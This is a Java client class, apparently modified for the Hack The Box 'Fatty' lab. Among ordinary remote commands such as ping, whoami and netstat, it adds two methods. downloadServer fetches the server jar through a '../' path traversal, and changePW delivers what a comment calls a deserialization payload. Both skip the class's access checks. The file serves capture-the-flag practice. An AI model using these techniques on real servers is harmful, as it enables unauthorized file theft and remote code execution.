package htb.fatty.client.methods;

import htb.fatty.client.connection.Connection;
import htb.fatty.shared.logging.FattyLogger;
import htb.fatty.shared.message.ActionMessage;
import htb.fatty.shared.message.Message;
import htb.fatty.shared.message.MessageBuildException;
import htb.fatty.shared.message.MessageParseException;
import htb.fatty.shared.message.ResponseMessage;
import htb.fatty.shared.resources.User;
import java.io.ByteArrayOutputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.util.Base64;

public class Invoker {
  private User user;
  
  private byte[] sessionID;
  
  private InputStream serverInputStream;
  
  private OutputStream serverOutputStream;
  
  private ActionMessage action;
  
  private Message message;
  
  private ResponseMessage response;
  
  private static FattyLogger logger = new FattyLogger();
  
  public Invoker(Connection connection, User user) {
    this.user = user;
    this.sessionID = connection.getSessionID();
    this.serverInputStream = connection.getServerInputStream();
    this.serverOutputStream = connection.getServerOutputStream();
  }
  
  public String ping() throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "ping");
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
  
  public String whoami() throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "whoami");
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
  
  public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "files");
    this.action.addArgument(folder);
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
  
  public String about() {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    String response = "Modified fatty client by Chr0x6eOs";
    return response;
  }
  
  public String contact() {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    String response = "This client was developed with <3 by qtc.";
    return response;
  }
  
  public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument(foldername);
    this.action.addArgument(filename);
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    String response = "";
    try {
      response = this.response.getContentAsString();
    } catch (Exception e) {
      response = "Unable to convert byte[] to String. Did you read in a binary file?";
    } 
    return response;
  }

  public String downloadServer() throws MessageParseException, MessageBuildException, IOException {
    this.action = new ActionMessage(this.sessionID, "open");
    
    String foldername = "../";
    String filename = "fatty-server.jar";

    this.action.addArgument(foldername);
    this.action.addArgument(filename);

    sendAndRecv();
    if (this.response.hasError())
      return "Error while communicating with server";
    
    try
    {
      String output_file = "fatty-server.jar";
      FileOutputStream fos = new FileOutputStream(output_file);
      fos.write(this.response.getContent());
      return "Downloaded server!";
    }
    catch (Exception e)
    {
      e.printStackTrace();
      return "Error while trying to download the server!";
    }
  }
  
  public String changePW(String username, String newPassword) throws MessageParseException, MessageBuildException, IOException {
    this.action = new ActionMessage(this.sessionID, "changePW");
    this.action.addArgument(newPassword); //Sending deserialization payload
    sendAndRecv();
    if (this.response.hasError())
      return "Error!";
    return this.response.getContentAsString();
  }
  
  public String uname() throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "uname");
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
  
  public String users() throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "users");
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
  
  public String netstat() throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "netstat");
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
  
  public String ipconfig() throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {
      
      }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user))
      return "Error: Method '" + methodName + "' is not allowed for this user account"; 
    this.action = new ActionMessage(this.sessionID, "ipconfig");
    sendAndRecv();
    if (this.response.hasError())
      return "Error: Your action caused an error on the application server!"; 
    return this.response.getContentAsString();
  }
  
  public void sendAndRecv() throws MessageParseException, MessageBuildException, IOException {
    this.action.send(this.serverOutputStream);
    this.message = Message.recv(this.serverInputStream);
    this.response = new ResponseMessage(this.message);
  }
}

